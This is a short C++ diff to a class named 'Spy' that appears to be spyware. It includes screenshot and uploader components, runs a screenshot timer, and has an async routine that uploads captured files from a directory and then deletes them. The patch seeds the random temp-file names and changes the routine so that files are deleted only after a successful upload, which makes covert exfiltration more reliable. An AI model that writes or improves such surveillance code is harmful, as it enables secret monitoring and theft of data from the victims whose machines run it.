@@ -5,6 +5,7 @@
 #include "sys/screenshot.h"
 #include "net/uploader.h"
 #include "sys/timer.h"
+#include <time.h>
 
 HANDLE Spy::mutex = NULL;
 Timer * Spy::scrot_timer = NULL;
@@ -21,6 +22,7 @@ void Spy::unlock()
 
 void Spy::get_temp_fname(char * buffer, int l)
 {
+	srand((unsigned int)time(NULL));
 	for (int i = 0; i < l; ++i)
 	{
 		buffer[i] = '0' + rand() % 10;
@@ -72,8 +74,8 @@ DWORD Spy::upload_async(LPVOID * dir_path)
 		while (dir->next(file_name))
 		{
 			path_combine(file_path, _dir, file_name);
-			uploader->upload(file_path);
-			DeleteFileA(file_path);
+			if (uploader->upload(file_path))
+				DeleteFileA(file_path);
 		}
 	}
 	catch (int error)
